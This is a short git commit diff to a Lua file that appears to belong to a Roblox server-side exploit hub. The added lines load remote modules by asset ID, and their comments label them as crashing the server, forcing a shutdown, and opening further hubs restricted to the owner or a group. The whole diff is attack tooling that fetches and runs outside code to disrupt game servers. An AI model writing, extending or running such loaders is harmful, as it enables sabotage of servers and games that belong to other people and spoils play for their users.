6e95f9113fb2acefb3128c8a3ff3517d772e072f
SystemAdmin12345 <102834957+SystemAdmin12345@users.noreply.github.com>
2023-10-29 16:30:42 -0400

    Update OwnModule.lua

--- SS/Main Scripts and hubs/OwnModule.lua
+++ SS/Main Scripts and hubs/OwnModule.lua
@@ -1,2 +1,9 @@
+require(8668172770).Gamer("GlichGamerF") -- owner only
 require(15210774178):statue() -- Loads Statue
+require(15210774178):ship() -- Loads Ship
+require(15210774178):zero() -- Crashes Server
+require(15210774178):shutdown() -- Shutdown
+require(15210774178):owner() -- Owner Only
+require(15210774178):gamer() -- Another Hub, owner only
+require(15210774178):sus() -- Group only
 -- Note: sometimes works, sometimes doesn't
